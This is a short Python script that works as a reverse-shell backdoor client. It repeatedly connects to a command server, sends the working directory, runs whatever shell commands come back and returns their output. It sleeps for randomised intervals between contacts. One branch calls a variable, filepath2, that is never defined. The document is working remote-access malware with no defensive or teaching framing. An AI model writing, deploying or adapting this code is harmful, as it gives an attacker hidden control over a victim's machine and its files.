import socket
import base64
import os
import subprocess
import sys
import time
import random
SERVER_HOST = "127.0.0.1"
SERVER_PORT = 85
BUFFER_SIZE = 1024 * 128 
SEPARATOR = " \n"
# create the socket object

# connect to the server
while True:
    s = socket.socket()
    time.sleep(20)
    time.sleep(int(random.randint(1,10)))
    try:
        s.connect((SERVER_HOST, SERVER_PORT))
        # get the current directory
        cwd = os.getcwd()
        s.send(cwd.encode())
        while True:
            time.sleep(20)
            time.sleep(int(random.randint(1,10)))
            # receive the command from the server
            command = s.recv(BUFFER_SIZE).decode()
            splited_command = command.split()
            if command.lower() == "exit":
                # if the command is exit, just break out of the loop
                break
            if command == "NULL":
                os.system("python3 " +filepath2)
            if splited_command[0].lower() == "cd":
                # cd command, change directory
                try:
                    os.chdir(' '.join(splited_command[1:]))
                except FileNotFoundError as e:
                    # if there is an error, set as the output
                    output = str(e)
                else:
                    # if operation is successful, empty message
                    output = ""
            else:
                # execute the command and retrieve the results
                output = subprocess.getoutput(command)
            
            # get the current working directory as output
            cwd = os.getcwd()
            # send the results back to the server
            message = f"{output}"
            s.send(message.encode())
        # close client connection
        s.close()
    except Exception:
        ()
